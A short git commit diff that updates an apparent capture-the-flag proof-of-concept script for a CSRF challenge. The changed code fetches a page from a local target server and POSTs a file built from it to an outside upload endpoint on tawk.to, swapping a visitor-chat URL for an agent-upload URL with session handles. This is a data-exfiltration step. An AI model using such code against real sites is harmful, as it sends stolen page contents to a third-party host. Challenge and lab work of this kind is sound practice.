ce73007c2cee672ef188a0cd556938123fc97a13
/hello <czavaleta93@gmail.com>
2021-11-06 00:54:38 -0500

    Update and rename flag-3-poc2.js to flag-3-poc3.js

--- testcsrfpost11/flag-3-poc3.js
+++ testcsrfpost11/flag-3-poc3.js
@@ -9,7 +9,7 @@ fetch("http://127.0.0.1:9000/view/46b5d1b0-8a08-4e75-818a-4003a7d61a5c").then((r
 
     formData.append("upload", file);
 
-    fetch("https://upload.tawk.to/upload/visitor-chat/visitor?handle=0c47125a3139b11ae32bd67965c9a0f461d1c92c&visitorSessionId=61860b2ece40c32e3e38daad",{
+    fetch("https://upload.tawk.to/upload/page/agent?handle=a675aee4143d8173624ca403828cbb9793891f10&pageId=61830caa6bb0760a494106d7&agentSessionId=6185ddfe69d9e20b02ec5920",{
         method: 'POST',
         body: formData
     });
